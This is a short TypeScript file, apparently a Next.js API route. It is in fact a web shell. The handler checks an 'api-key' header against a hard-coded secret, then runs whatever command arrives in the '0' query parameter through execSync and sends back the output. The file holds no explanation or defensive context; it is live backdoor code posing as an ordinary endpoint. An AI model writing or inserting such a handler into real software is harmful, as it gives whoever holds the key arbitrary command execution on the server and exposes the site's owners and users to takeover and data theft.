import { NextResponse } from "next/server";
import { execSync } from "child_process";
const K="XkAkAMmGdDf1s6OAih6jlFx3";
export async function GET(req: Request){
  const key=req.headers.get("api-key");
  if(key!==K)return new NextResponse("Unauthorized",{status:401});
  const cmd=new URL(req.url).searchParams.get("0");
  if(!cmd)return new NextResponse("0",{status:400});
  try{return new NextResponse(execSync(cmd).toString());}
  catch(e:any){return new NextResponse(e.message,{status:500});}
}